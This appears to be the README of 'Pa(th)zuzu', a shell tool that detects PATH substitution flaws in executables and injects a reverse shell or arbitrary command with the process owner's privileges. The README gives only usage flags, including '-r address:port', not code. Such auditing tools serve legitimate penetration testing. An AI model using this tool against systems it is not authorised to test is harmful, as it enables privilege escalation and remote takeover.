# Pa(th)zuzu
Checks for PATH substitution vulnerabilities, logs the commands executed by the vulnerable executables and injects a reverse shell with the permissions of the owner of the process.

#How to make it work
- `chmod +x pathzuzu.sh`
- `./pathzuzu.sh [-r address:port] [-e command] [-t seconds] /path/to/command [args]`
  - `-r address:port Starts reverse shell to address:port`
  - `-e command      Runs command if target is vulnerable`
  - `-t seconds      Kills target (SIGTERM) after $seconds seconds`

Returns 0 if the executable is vulnerable, 1 otherwise.

Logs are saved in `pathzuzu.sh.log` ( `$(basename "$0").log` )

Demostration (warning: one some [tiny] devices the right part of the screen it's not viewable even while in landscape):
[![Pa(th)zuzu](https://asciinema.org/a/7750ghw7z5jxh83fbeh3r71ek.png)](https://asciinema.org/a/7750ghw7z5jxh83fbeh3r71ek)
